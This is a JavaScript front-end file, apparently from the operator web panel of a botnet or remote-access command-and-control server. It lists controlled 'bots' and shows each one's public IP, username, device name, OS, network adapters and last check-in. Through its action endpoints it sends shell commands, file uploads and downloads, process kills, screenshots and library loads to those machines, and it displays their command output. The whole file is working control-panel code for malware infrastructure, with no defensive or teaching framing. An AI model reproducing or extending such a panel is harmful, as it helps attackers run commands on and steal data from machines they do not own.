/*
=================================================
Data loading
*/
function LoadBots() {
	$(function() {
		fetchServerStats();
		$.getJSON("/api/v1/bots", function(json) {
			$.each(json, function(i, field) {
				console.log(i)
			});
		});
	});
}

function addEnterListener(textboxId, func) {
	$(textboxId)[0].addEventListener("keyup", function (event) {
		if (event.keyCode == 13) {
			var arg = $(textboxId)[0].value;
			if (arg !== ""){
				//console.log(id + " " + arg);
				func(id, arg);
				$(textboxId)[0].value = "";
			}
		}
	});
}

function addEnterListener2(textboxId1, textboxId2, func) {

	$(textboxId1)[0].addEventListener("keyup", function (event) {
		if (event.keyCode == 13) {
			var arg1 = $(textboxId1)[0].value;
			var arg2 = $(textboxId2)[0].value;
			if (arg1 !== "" && arg2 !== "") {
				//console.log(id + " " + arg1 + " " + arg2);
				func(id, arg1, arg2);
				$(textboxId1)[0].value = "";
				$(textboxId2)[0].value = "";
			}
		}
	});

	$(textboxId2)[0].addEventListener("keyup", function (event) {
		if (event.keyCode == 13) {
			var arg1 = $(textboxId1)[0].value;
			var arg2 = $(textboxId2)[0].value;
			if (arg1 !== "" && arg2 !== "") {
				//console.log(id + " " + arg1 + " " + arg2);
				func(id, arg1, arg2);
				$(textboxId1)[0].value = "";
				$(textboxId2)[0].value = "";
			}
		}
	});

}

function addEscapeListener(modalIds){
	// When the user clicks anywhere outside of the modal, close it
	modalIds = modalIds;
	window.onclick = function(event) {
		$.each(modalIds, function(i, id) {
			var modal = $(id)[0];
			if (event.target == modal) {
				modal.style.display = "none";
			}
		});
	}
	// When the user hits escape, close all modals
	window.addEventListener("keyup", function (event) {
		if (event.keyCode == 27) {
			$.each(modalIds, function(i, id) {
				var modal = $(id)[0];
				modal.style.display = "none";
			});
		}
	});
}

function init() {
	modal("#uploadmodal", "#uploadbutton", "#uploadclose");
	modal("#downloadmodal", "#downloadbutton", "#downloadclose");
	modal("#loadlibrarymodal", "#loadlibrarybutton", "#loadlibraryclose");
	//modal("#deletemodal", "#deletebutton", "#deleteclose")

	addEnterListener("#command", run);
	addEnterListener("#uploadtext", upload);
	addEnterListener("#loadlibrarytext", loadlibrary);
	addEnterListener2("#downloadurltext", "#downloadpathtext", download);
	addEscapeListener(["#uploadmodal", "#downloadmodal", "#loadlibrarymodal", "#deletemodal"]);

	refreshHandler(id);
	setInterval(function(){ refreshHandler(id);}, 10000 )
}

function refreshHandler(id) {
	refreshBotInfo(id);
	refreshNetworkData(id);
	refreshCommandHistory(id);
}

function refreshBotInfo(id){
	$.getJSON("/api/v1/bot/" + id , function(json) {
		//console.log(json)
		$("#uuid")[0].innerText = json["uuid"]
		$("#external-ip")[0].innerText = json["public_ip"]
		$("#os")[0].innerText = json["os"]["ProductName"] + " " + json["os"]["DisplayVersion"]
		$("#username")[0].innerText = json["username"]
		$("#devicename")[0].innerText = json["devicename"]
		$("#region")[0].innerText = json["region"]
		$("#memory-amount")[0].innerText = json["memory"]
		$("#queue")[0].innerText = json["queue"]
		var date = new Date(json["checkin"] * 1000);
		$("#lastseen")[0].innerText = date.toLocaleString();
	});
}

function refreshNetworkData(id){
	$.getJSON("/api/v1/network/" + id , function(json) {
		console.log(json)
		$("#netinfo").empty()
		$.each(json, function(i, field) {
			console.log(i);
			adaptername = i;
			mac = json[i]["mac"];
			ip = json[i]["ip"];
			$("#netinfo").append("<div class=\"bot netinfo\"><p>" + adaptername + "</p><p>" + mac + "</p><p>" + ip + "</p></div><br>")
		});
	});
}

function refreshCommandHistory(id) {
	$.getJSON("/api/v1/commandhistory/" + id , function(json) {
		$("#shellexec").empty()
		$.each(json, function(i, field) {
			$("#shellexec").append($("<p>").text(">" + json[i]["command"])) 
			$.each(json[i]["output"].split("\n"), function(j, fld) {
				$("#shellexec").append($("<p>").text(fld)) 
			});
			$("#shellexec").append($("<br>")) 
		});
	});
}

function fetchProcessList(id) {
	$.getJSON("/api/v1/processlist/" + id , function(json) {
		console.log(json)
	});
}



function fetchCommandHistory(id) {
	$.getJSON("/api/v1/commandhistory/" + id , function(json) {
		console.log(json);
	});
}

function fetchServerStats() {
	$.getJSON("/api/v1/stats", function(json) {
		console.log(json);
	});
}

function fetchUsername() {
	$.getJSON("/api/v1/username", function(json) {
		console.log(json);
	});
}

/*
=================================================
Actions
*/
function deleteBot(id){
	$.ajax({
		type: "POST",
		url: "/action/delete",
		data: {'id':id},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

function run(id, command) {
	$.ajax({
		type: "POST",
		url: "/action/run",
		data: {'id':id, 'cmd':command},
		encode: true,
    }).done(function (data) {
		//console.log(data);
    });
}

function upload(id, path) {
	$.ajax({
		type: "POST",
		url: "/action/upload",
		data: {'id':id, 'path':path},
		encode: true,
    }).done(function (data) {
		//console.log(data);
    });
}

function download(id, url, filepath) {
	$.ajax({
		type: "POST",
		url: "/action/download",
		data: {'id':id, 'url':url, 'filepath':filepath},
		encode: true,
    }).done(function (data) {
		//console.log(data);
    });
}

function kill(id, pid) {
	$.ajax({
		type: "POST",
		url: "/action/kill",
		data: {'id':id, 'pid':pid},
		encode: true,
    }).done(function (data) {
		//console.log(data);
    });
}

function info(id) {
	$.ajax({
		type: "POST",
		url: "/action/info",
		data: {'id':id},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

function ps(id) {
	$.ajax({
		type: "POST",
		url: "/action/ps",
		data: {'id':id},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

function ss(id) {
	$.ajax({
		type: "POST",
		url: "/action/ss",
		data: {'id':id},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

function loadlibrary(id, librarypath) {
	$.ajax({
		type: "POST",
		url: "/action/loadlibrary",
		data: {'id':id, 'librarypath':librarypath},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

function clearqueue(id){
	$.ajax({
		type: "POST",
		url: "/action/clear",
		data: {'id':id},
		encode: true,
    }).done(function (data) {
      //console.log(data);
    });
}

/*
=====================================
UI
*/
function hideNetInfo(index) {
	if($("#netinfo")[index].hidden) {
		$("#hidenetinfo")[index].src = "../static/icon/arrow-up-s-line.svg";
		$("#netinfo")[index].hidden = false;
	} else {
		$("#hidenetinfo")[index].src = "../static/icon/arrow-down-s-line.svg";
		$("#netinfo")[index].hidden = true;
	}
}

function hideShell(index) {
	if($("#shellexecouter")[index].hidden) {
		$("#shellexecouter")[index].hidden = false;
	} else {
		$("#shellexecouter")[index].hidden = true;
	}
}

function startClock(time) {
	var date = new Date(Date.now());
	$("#clock")[0].textContent = date;
}


function modal(modalId, buttonId, closeId) {
	// Get the modal
	var modal = $(modalId)[0];
	// Get the button that opens the modal
	var btn = $(buttonId)[0];
	// Get the <span> element that closes the modal
	var span = $(closeId)[0];
	// When the user clicks the button, open the modal 
	btn.onclick = function() {
  		modal.style.display = "block";	
	}
	// When the user clicks on <span> (x), close the modal
	span.onclick = function() {
  		modal.style.display = "none";
	}
}
